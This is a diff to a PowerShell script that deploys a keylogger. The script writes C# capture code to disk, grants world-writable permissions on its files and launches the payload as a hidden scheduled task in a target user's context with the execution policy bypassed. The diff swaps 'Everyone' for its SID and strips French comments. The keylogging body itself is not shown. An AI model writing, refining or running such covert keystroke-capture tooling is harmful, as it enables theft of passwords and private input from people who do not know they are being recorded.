@@ -12,12 +12,12 @@ $base = "$OutputDir\keylog"
 
 Write-Host "[*] Creating working directory and setting ACL..." -ForegroundColor Cyan
 New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
-icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null
+icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 
 Write-Host "[*] Cleaning up previous files..." -ForegroundColor Cyan
 Remove-Item -Path "$base.ps1","$base.log","$OutputDir\keylog-type.cs","$OutputDir\compile-error.log" -Force -ErrorAction SilentlyContinue
 New-Item -Path "$base.log" -ItemType File -Force | Out-Null
-icacls "$base.log" /grant "Everyone:(F)" | Out-Null
+icacls "$base.log" /grant "*S-1-1-0:(F)" | Out-Null
 
 Write-Host "[*] Creating C# type file..." -ForegroundColor Cyan
 $csharp = @'
@@ -162,7 +162,7 @@ public class KeylogTimer {
 }
 '@
 Set-Content -Path "$OutputDir\keylog-type.cs" -Value $csharp -Encoding ASCII
-icacls "$OutputDir\keylog-type.cs" /grant "Everyone:(F)" | Out-Null
+icacls "$OutputDir\keylog-type.cs" /grant "*S-1-1-0:(F)" | Out-Null
 
 Write-Host "[*] Creating PS1 payload script..." -ForegroundColor Cyan
 $ps1 = @"
@@ -171,9 +171,8 @@ Add-Type -TypeDefinition `$cs 2>&1 | Out-File "$OutputDir\compile-error.log"
 [KeylogTimer]::Run("$base.log", $Duration)
 "@
 Set-Content -Path "$base.ps1" -Value $ps1 -Encoding ASCII
-icacls "$base.ps1" /grant "Everyone:(F)" | Out-Null
+icacls "$base.ps1" /grant "*S-1-1-0:(F)" | Out-Null
 
-# Creation et lancement de la tache planifiee (fenetre cachee + tache cachee)
 Write-Host "[*] Creating and starting scheduled task as $TargetUser (hidden)..." -ForegroundColor Cyan
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $base.ps1" -WorkingDirectory $OutputDir
@@ -185,7 +184,6 @@ Start-ScheduledTask -TaskName $TaskName
 Write-Host "[*] Keylogger running for ${Duration}s in context of $TargetUser (window hidden, task hidden)..." -ForegroundColor Cyan
 Write-Host "[*] Output : $base.log" -ForegroundColor Cyan
 
-# Attente de la fin
 $elapsed = 0
 $totalWait = $Duration + 15
 while ($elapsed -lt $totalWait) {
@@ -196,7 +194,6 @@ while ($elapsed -lt $totalWait) {
     Write-Host "[*] Still running... ($elapsed / ${totalWait}s)" -ForegroundColor Cyan
 }
 
-# Resultat
 $result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
 if ($result -eq 0) {
     Write-Host "[+] Keylogger completed successfully !" -ForegroundColor Green
@@ -213,6 +210,5 @@ if ($result -eq 0) {
     Get-Content "$OutputDir\compile-error.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
 }
 
-# Nettoyage
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan
